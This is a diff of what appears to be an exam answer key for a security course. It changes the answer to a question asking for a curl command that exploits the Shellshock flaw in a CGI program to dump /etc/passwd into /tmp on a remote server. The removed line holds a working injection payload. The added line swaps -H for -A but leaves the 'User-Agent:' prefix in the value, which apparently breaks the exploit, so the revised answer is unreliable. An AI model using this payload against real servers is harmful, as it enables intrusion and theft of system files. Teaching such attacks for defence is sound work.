@@ -38,4 +38,4 @@ Answer: Yes, ASLR provides protection from return to libc attacks by randomizing
 
 Assume you know the address of a http server with the shellshock vulnerability and a myCommand CGI program available (in the default CGI-BIN folder).
 10/10) Write the curl command that makes an http request that exploits the shellshock vulnerability and executes the "cat /etc/passwd" command redirecting the output to a file named pippo.txt in the folder /tmp on the remote server
-Answer: curl -H 'User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd > /tmp/pippo.txt' http://<server-address>/cgi-bin/myCommand
+Answer: curl -A 'User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd > /tmp/pippo.txt' http://<server-address>/cgi-bin/myCommand
